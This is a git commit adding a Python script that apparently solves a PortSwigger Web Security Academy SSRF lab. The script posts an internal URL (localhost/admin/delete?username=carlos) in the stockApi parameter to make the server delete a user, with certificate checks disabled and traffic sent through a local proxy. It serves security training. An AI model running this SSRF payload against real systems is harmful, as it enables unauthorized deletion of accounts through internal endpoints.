0635a9f7e1e98598833982550cf574ba74c6d457
Ferhat Karasu <74055034+ferhatkarasu@users.noreply.github.com>
2025-02-09 13:43:08 +0300

    Create portswigger_websecurityacademy_ssrf1.py

---
+++ portswigger_websecurityacademy_ssrf1.py
@@ -0,0 +1,32 @@
+import sys
+import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+
+def delete_user(url):
+
+    delete_payload="http://localhost/admin/delete?username=carlos"
+    stock_path="/product/stock"
+    params= {'stockApi': delete_payload}
+    response = requests.post(url + stock_path, data=params, verify=False, proxies=proxies )
+
+
+
+def main():
+
+    if len(sys.argv) != 2:
+
+        print("You must enter an input !!!")
+        print("Example: %s www.example.com "% sys.argv[0])
+        sys.exit(-1)
+
+    url = sys.argv[1]
+    print("Deleting user.............pelase wait")
+    delete_user(url)
+
+if __name__ == "__main__":
+    main()
